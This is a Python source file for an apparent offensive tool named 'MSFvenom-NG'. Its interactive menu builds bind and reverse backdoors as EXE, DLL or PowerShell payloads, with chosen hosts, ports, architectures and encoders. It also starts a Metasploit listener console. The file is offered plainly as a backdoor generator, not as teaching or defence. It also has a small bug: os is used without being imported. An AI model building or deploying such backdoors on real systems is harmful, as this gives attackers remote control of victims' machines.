from lib.gen import gen
from lib.enc import enc
from lib.utils import cprint
import sys

class console(object):
    def __init__(self):
        self.g = gen()
        self.e = enc()

    def interface(self):
        print('''
        (E)XE/DLL Backdoor
        (P)owershell Backdoor
        (S)tart msf Listener
        (C)ustom Settings
        (Q)uit
        ''')
        inp = input('MSFvenom-NG>:')
        if inp.upper() == 'E':
            print('''
        (B)ind Backdoor
        (R)everse Backdoor
        (G)o Home
                ''')
            inp = input('MSFvenom-NG(EXE/DLL_Backdoor):')
            if inp.upper() == 'B':
                host = input('MSFvenom-NG(EXE/DLL_Backdoor:RHOST):')
                port = input('MSFvenom-NG(EXE/DLL_Backdoor:LPORT):')
                arch = input('MSFvenom-NG(EXE_DLL_Backdoor:ARCH(x86,x64)):')
                fmt = input('MSFvenom-NG(EXE/DLL_Backdoor:FORMAT(exe,dll)):')
                jsondata = self.e.get_encs()
                self.e.print_encs(jsondata,arch)
                rule = input('MSFvenom-NG(EXE/DLL_Backdoor:RULE):')
                encs = self.e.parse_encs(arch,self.e.index_encs(jsondata,arch,rule))
                args = self.g.parse_args({'RHOST': host,'LPORT': port})
                self.g.build_exe_dll(arch,'bind',args+encs,fmt)
            elif inp.upper() == 'R':
                host = input('MSFvenom-NG(EXE/DLL_Backdoor:LHOST):')
                port = input('MSFvenom-NG(EXE/DLL_Backdoor:LPORT):')
                arch = input('MSFvenom-NG(EXE_DLL_Backdoor:ARCH(x86,x64)):')
                fmt = input('MSFvenom-NG(EXE/DLL_Backdoor:FORMAT(exe,dll)):')
                jsondata = self.e.get_encs()
                self.e.print_encs(jsondata,arch)
                rule = input('MSFvenom-NG(EXE/DLL_Backdoor:RULE):')
                encs = self.e.parse_encs(arch,self.e.index_encs(jsondata,arch,rule))
                args = self.g.parse_args({'LHOST': host,'LPORT': port})
                self.g.build_exe_dll(arch,'reverse',args+encs,fmt)
            elif inp.upper() == 'G':
                self.interface()
        elif inp.upper() == 'P':
            print('''
        (B)ind Backdoor
        (R)everse Backdoor
        (G)o Home
                ''')
            inp = input('MSFvenom-NG(Powershell_Backdoor):')
            if inp.upper() == 'B':
                host = input('MSFvenom-NG(Powershell_Backdoor:RHOST):')
                port = input('MSFvenom-NG(Powershell_Backdoor:LPORT):')
                arch = input('MSFvenom-NG(Powershell_Backdoor:ARCH(x86,x64)):')
                fmt = input('MSFvenom-NG(Powershell_Backdoor:FORMAT(raw,ps1)):')
                ite = input('MSFvenom-NG(Powershell_Backdoor:ITERATION_NUMBER):')
                args = self.g.parse_args({'RHOST': host,'LPORT': port})
                self.g.build_ps1(arch,'bind',ite,args,fmt)
            elif inp.upper() == 'R':
                host = input('MSFvenom-NG(Powershell_Backdoor:LHOST):')
                port = input('MSFvenom-NG(Powershell_Backdoor:LPORT):')
                arch = input('MSFvenom-NG(Powershell_Backdoor:ARCH(x86,x64)):')
                fmt = input('MSFvenom-NG(Powershell_Backdoor:FORMAT(raw,ps1)):')
                ite = input('MSFvenom-NG(Powershell_Backdoor:ITERATION_NUMBER):')
                args = self.g.parse_args({'LHOST': host,'LPORT': port})
                self.g.build_ps1(arch,'reverse',ite,args,fmt)
            elif inp.upper() == 'G':
                self.interface()
        elif inp.upper() == 'S':
            cprint('Starting Metasploit Frameworok Console','info')
            os.system('msfconsole')
        elif inp.upper() == 'C':
            cprint('TODO','err')
            self.interface()
        elif inp.upper() == 'Q':
            sys.exit()
        else:
            cprint('Wrong Commands','err')
            self.interface()